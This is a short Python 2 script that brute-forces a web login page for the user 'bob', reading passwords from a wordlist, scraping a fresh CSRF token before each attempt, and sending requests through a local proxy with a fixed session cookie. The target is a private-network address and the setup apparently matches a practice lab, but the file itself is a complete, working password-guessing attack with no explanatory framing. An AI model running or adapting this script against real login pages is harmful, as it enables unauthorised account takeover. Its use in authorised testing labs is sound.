import string
import urllib
import urllib2
import re
import time
import sys
import os
from bs4 import BeautifulSoup
import BeautifulSoup
from BeautifulSoup import BeautifulSoup
url = "http://10.25.5.9/login.php"
username = "bob"
input_file = open('/root/Desktop/Wordlist.txt')
proxy = urllib2.ProxyHandler({'http': '127.0.0.1:8080'})
opener = urllib2.build_opener(proxy)
urllib2.install_opener(opener)
opener.addheaders.append(('Cookie', 'PHPSESSID=64qfhe557fm3mq74n9vm1ldfu4'))
for guess in input_file.readlines():
	i = guess.strip("\r\n")
	content = urllib2.urlopen(url).read()
	soup = BeautifulSoup(content)
	csrf=str(soup.find('input', {'name':'user_token'}).attrs[2][1])
	postdata = urllib.urlencode({'username': username,'password': i,'Login': 'Login','user_token': csrf})
	content2 = urllib2.urlopen(url,postdata).read()
	#uncomment below to debug post data 
	#print postdata 
	#uncomment below to debug returned content 
	#print content2
	matches = re.findall(r'(?i)Login failed', content2)
	#uncomment below to debug regex query
	#print matches
	if len(matches) > 0:
	#uncomment below to debug attempted passwords
		print i + " - is not the password"
		#uncomment below to throttle down script speed - change sleep timer as needed
		#time.sleep(0.1)
		continue
	else:
		print "\n\nPassword found - " + i
		break